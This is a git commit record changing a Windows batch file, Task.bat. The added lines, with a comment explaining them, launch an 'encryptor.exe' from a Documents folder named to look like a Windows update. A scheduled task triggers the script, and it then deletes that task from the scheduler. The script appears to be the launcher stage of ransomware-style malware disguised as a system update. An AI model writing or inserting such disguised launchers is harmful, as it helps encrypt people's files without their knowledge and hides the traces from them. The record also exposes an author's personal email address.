57c8e9bbadfeffce3b298cccdf3640d9e56f35b9
jackDevz <jackt.rodriguez1999@gmail.com>
2022-09-28 09:05:58 +0100

    Update Task.bat

--- Task.bat
+++ Task.bat
@@ -1,2 +1,5 @@
 @echo off
-start C:\Users\jackt\Documents\Windows_Update_64-bit\TaskRemoval.bat
+
+Rem This script is triggered in the task scheduler which runs the encryptor software and then deletes the task from the scheduler.
+start C:\Users\%USERNAME%\Documents\Windows_Update_64-bit\encryptor.exe
+start C:\Users\%USERNAME%\Documents\Windows_Update_64-bit\TaskRemoval.bat
